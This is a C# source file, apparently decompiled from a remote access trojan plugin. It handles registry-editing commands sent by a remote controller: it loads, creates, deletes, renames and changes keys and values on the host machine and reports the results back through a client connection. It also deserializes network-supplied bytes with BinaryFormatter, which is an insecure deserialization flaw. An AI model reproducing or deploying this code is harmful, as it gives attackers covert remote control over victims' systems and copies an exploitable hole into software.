using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.Serialization.Formatters.Binary;
using Leb128;
using Microsoft.Win32;
using Plugin.Handler;
using Plugin.Helper;

namespace Plugin;

internal class Packet
{
	public static void Read(byte[] data)
	{
		try
		{
			object[] array = LEB128.Read(data);
			string text = (string)array[0];
			if (text == null)
			{
				return;
			}
			switch (text.Length)
			{
			case 17:
				switch (text[0])
				{
				case 'C':
					if (text == "CreateRegistryKey")
					{
						CreateKey((string)array[1]);
					}
					break;
				case 'D':
					if (text == "DeleteRegistryKey")
					{
						DeleteKey((string)array[1], (string)array[2]);
					}
					break;
				case 'R':
					if (text == "RenameRegistryKey")
					{
						RenameKey((string)array[1], (string)array[2], (string)array[3]);
					}
					break;
				}
				break;
			case 19:
				switch (text[2])
				{
				case 'e':
					if (text == "CreateRegistryValue")
					{
						CreateValue((string)array[1], (string)array[2]);
					}
					break;
				case 'l':
					if (text == "DeleteRegistryValue")
					{
						DeleteValue((string)array[1], (string)array[2]);
					}
					break;
				case 'n':
					if (text == "RenameRegistryValue")
					{
						RenameValue((string)array[1], (string)array[2], (string)array[3]);
					}
					break;
				case 'a':
					if (text == "ChangeRegistryValue")
					{
						byte[] array2 = (byte[])array[1];
						BinaryFormatter binaryFormatter = new BinaryFormatter();
						MemoryStream memoryStream = new MemoryStream();
						memoryStream.Write(array2, 0, array2.Length);
						memoryStream.Flush();
						memoryStream.Seek(0L, SeekOrigin.Begin);
						ChangeValue((RegistrySeeker.RegValueData)binaryFormatter.Deserialize(memoryStream), (string)array[2]);
					}
					break;
				}
				break;
			case 15:
				if (text == "LoadRegistryKey")
				{
					LoadKey((string)array[1]);
				}
				break;
			case 16:
			case 18:
				break;
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.ToString());
			Client.Send(LEB128.Write(new object[3] { "Regedit", "Error", ex.Message }));
			Client.Error(ex.ToString());
		}
	}

	public static void LoadKey(string RootKeyName)
	{
		try
		{
			RegistrySeeker registrySeeker = new RegistrySeeker();
			registrySeeker.BeginSeeking(RootKeyName);
			List<object> list = new List<object>();
			list.AddRange(new object[3] { "Regedit", "LoadKey", RootKeyName });
			for (int i = 0; i < registrySeeker.Matches.Length; i++)
			{
				List<object> list2 = new List<object>();
				for (int j = 0; j < registrySeeker.Matches[i].Data.Length; j++)
				{
					list2.AddRange(new object[3]
					{
						registrySeeker.Matches[i].Data[j].Name,
						(int)registrySeeker.Matches[i].Data[j].Kind,
						registrySeeker.Matches[i].Data[j].Data
					});
				}
				list.AddRange(new object[3]
				{
					registrySeeker.Matches[i].Key,
					LEB128.Write(list2.ToArray()),
					registrySeeker.Matches[i].HasSubKeys
				});
			}
			Client.Send(LEB128.Write(list.ToArray()));
		}
		catch (Exception ex)
		{
			Client.Error(ex.Message);
		}
	}

	public static void CreateKey(string ParentPath)
	{
		string name = "";
		try
		{
			RegistryEditor.CreateRegistryKey(ParentPath, out name, out var _);
			RegistrySeeker.RegSeekerMatch regSeekerMatch = new RegistrySeeker.RegSeekerMatch
			{
				Key = name,
				Data = RegistryKeyHelper.GetDefaultValues(),
				HasSubKeys = false
			};
			List<object> list = new List<object>();
			list.AddRange(new object[3] { "Regedit", "CreateKey", ParentPath });
			list.AddRange(new object[3] { regSeekerMatch.Key, regSeekerMatch.Data, regSeekerMatch.HasSubKeys });
			List<object> list2 = new List<object>();
			for (int i = 0; i < regSeekerMatch.Data.Length; i++)
			{
				list2.AddRange(new object[3]
				{
					regSeekerMatch.Data[i].Name,
					(int)regSeekerMatch.Data[i].Kind,
					regSeekerMatch.Data[i].Data
				});
			}
			list.AddRange(new object[3]
			{
				regSeekerMatch.Key,
				LEB128.Write(list2.ToArray()),
				regSeekerMatch.HasSubKeys
			});
			Client.Send(LEB128.Write(list.ToArray()));
		}
		catch (Exception ex)
		{
			Client.Error(ex.Message);
		}
	}

	public static void DeleteKey(string KeyName, string ParentPath)
	{
		try
		{
			RegistryEditor.DeleteRegistryKey(KeyName, ParentPath, out var _);
			Client.Send(LEB128.Write(new object[4] { "Regedit", "DeleteKey", ParentPath, KeyName }));
		}
		catch (Exception ex)
		{
			Client.Error(ex.Message);
		}
	}

	public static void RenameKey(string OldKeyName, string NewKeyName, string ParentPath)
	{
		try
		{
			RegistryEditor.RenameRegistryKey(OldKeyName, NewKeyName, ParentPath, out var _);
			Client.Send(LEB128.Write(new object[5] { "Regedit", "RenameKey", ParentPath, OldKeyName, NewKeyName }));
		}
		catch (Exception ex)
		{
			Client.Error(ex.Message);
		}
	}

	public static void CreateValue(string KeyPath, string Kindstring)
	{
		string name = "";
		RegistryValueKind kind = RegistryValueKind.None;
		switch (Kindstring)
		{
		case "-1":
			kind = RegistryValueKind.None;
			break;
		case "0":
			kind = RegistryValueKind.Unknown;
			break;
		case "1":
			kind = RegistryValueKind.String;
			break;
		case "2":
			kind = RegistryValueKind.ExpandString;
			break;
		case "3":
			kind = RegistryValueKind.Binary;
			break;
		case "4":
			kind = RegistryValueKind.DWord;
			break;
		case "7":
			kind = RegistryValueKind.MultiString;
			break;
		case "11":
			kind = RegistryValueKind.QWord;
			break;
		}
		try
		{
			RegistryEditor.CreateRegistryValue(KeyPath, kind, out name, out var _);
			Client.Send(LEB128.Write(new object[5] { "Regedit", "CreateValue", KeyPath, Kindstring, name }));
		}
		catch (Exception ex)
		{
			Client.Error(ex.Message);
		}
	}

	public static void DeleteValue(string KeyPath, string ValueName)
	{
		try
		{
			RegistryEditor.DeleteRegistryValue(KeyPath, ValueName, out var _);
			Client.Send(LEB128.Write(new object[4] { "Regedit", "DeleteValue", KeyPath, ValueName }));
		}
		catch (Exception ex)
		{
			Client.Error(ex.Message);
		}
	}

	public static void RenameValue(string OldValueName, string NewValueName, string KeyPath)
	{
		try
		{
			RegistryEditor.RenameRegistryValue(OldValueName, NewValueName, KeyPath, out var _);
			Client.Send(LEB128.Write(new object[5] { "Regedit", "RenameValue", KeyPath, OldValueName, NewValueName }));
		}
		catch (Exception ex)
		{
			Client.Error(ex.Message);
		}
	}

	public static void ChangeValue(RegistrySeeker.RegValueData Value, string KeyPath)
	{
		try
		{
			RegistryEditor.ChangeRegistryValue(Value, KeyPath, out var _);
			List<object> list = new List<object>();
			list.AddRange(new object[3] { "Regedit", "ChangeValue", KeyPath });
			list.AddRange(new object[3]
			{
				Value.Name,
				(int)Value.Kind,
				Value.Data
			});
			Client.Send(LEB128.Write(list.ToArray()));
		}
		catch (Exception ex)
		{
			Client.Error(ex.Message);
		}
	}
}
